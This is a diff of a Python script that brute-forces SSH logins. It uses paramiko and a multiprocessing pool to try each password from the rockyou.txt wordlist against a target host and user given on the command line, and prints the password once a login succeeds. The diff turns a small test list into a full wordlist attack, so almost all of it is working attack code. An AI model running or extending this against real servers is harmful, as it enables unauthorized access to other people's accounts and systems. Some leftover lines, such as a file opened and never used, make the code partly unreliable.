@@ -18,18 +18,19 @@ def get_arguments():
         parser.error("[-] Please specify a username, use --help for more info")
     return options 
 
-def ssh_attack(user,address,password,event, array,q):
+def ssh_attack(user,address,password,event,q):
     if not event.is_set():
         print('Testing password: ' + password)
         try :
             ssh.connect(address, username=user, password=password)
             array=password
+            q.put(password)
             print(password)
             event.set()
+            print('found')
             return True
 
         except paramiko.ssh_exception.AuthenticationException:
-            print("authentication failed")
             return False
 
 def init(vv):
@@ -44,67 +45,55 @@ if __name__ == '__main__':
     get_ping(str(options.target))
 
     #retrieving a dictionnary of password
-    pass_list = ['test1','test2','test3', 'toor', 'test3', 'test3', 'test3']
+    pass_list = ['test1','test2','test3', 'to0r', 'test3', 'test3', 'test3', 'test5', 'test8', 'asdf3', 'toor']
 
     #creating the ssh connection object
     ssh = paramiko.SSHClient()
+
+    #this is to add new host automatically
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-    #Preparing the multiprocessing
+#preparing dictionnary to read passwords
+    f = open('pass.txt','r')
+##############################3
+#Preparing the multiprocessing
+#Working with pool, because you cannot set the number of process with the process class
+
     #Preparing the pool
-    #pool = mp.Pool(processes=4)
+    pool = mp.Pool(processes=2)
 
     # Preparing the array to return the password value
-    q = mp.Queue()
-    array = mp.Array('c', 15)
-    pool = mp.Pool(initializer=init, initargs = (array,), processes=4)
+
     manager = mp.Manager()
-    event = manager.Event()
+    queue = manager.Queue() #This is needed to retrieve the final password
+    event = manager.Event() #This is needed to stop the processing when password is found
 
     t1 = time.time()
 
     '''For Asynchronous'''
     #for x in pass_list:
-    #    re = pool.apply_async(ssh_attack, args=(options.user, options.target, x, event, array))
-    #print(re.get())
+    #    worker = pool.apply_async(ssh_attack, args=(options.user, options.target, x, event,queue))
+
+   # #while True:
+    with open('rockyou.txt','r') as f:
+        for x in f:
+            x = x.strip()
+            worker = pool.apply_async(ssh_attack, args=(options.user, options.target, x, event,queue))
+            #print(x, type(x))
+            if x.strip() == "" : continue
+    print("The password is " + queue.get())
+
+    print('Code executed in: '+ str(time.time() - t1))
+    exit(0)
 
 ##############################3
-
-    for password in pass_list:
-        p = mp.Process(target=ssh_attack, args=(options.user, options.target, password, event,array,q))
-        p.start()
-        #print(q.get())
-        #p.join()
-    print(array[:])
+##Working with process
+#    for password in pass_list:
+#       p = mp.Process(target=ssh_attack, args=(options.user, options.target, password, event,array,q))
+#       p.start()
+#
+#       #p.join()
+#    print("The password is " + q.get())
+#    print(array[:])
 #########################33
-    print('Code executed in: ', time.time() - t1)
     
-    ####################################################
-    #Test on data sharing in multiprocessing
-    #Also see here for some more doc on share c_types
-    # https://docs.python.org/3/library/multiprocessing.html#module-multiprocessing.sharedctypes
-    ####################################################
-#    def f(q,x,n, array):
-#    print(x%2)
-#    if x==3:
-#        n.value = 3
-#        i =0
-#        #for j in "test":
-#        #    array[i] = j
-#        #    i+=1
-#        array="test"
-#
-#    q.put([x])
-#
-#if __name__ == '__main__':
-#    n = Value('i',1)
-#    q = Queue()
-#    array = Array('c', 15)
-#
-#    p = [Process(target=f, args=(q,x,n,array)) for x in range(5)]
-#    for pr in p:
-#       pr.start()
-#        print(q.get())    # prints "[42, None, 'hello']"
-#        pr.join()
-#print(n.value)
-#print(array[:])
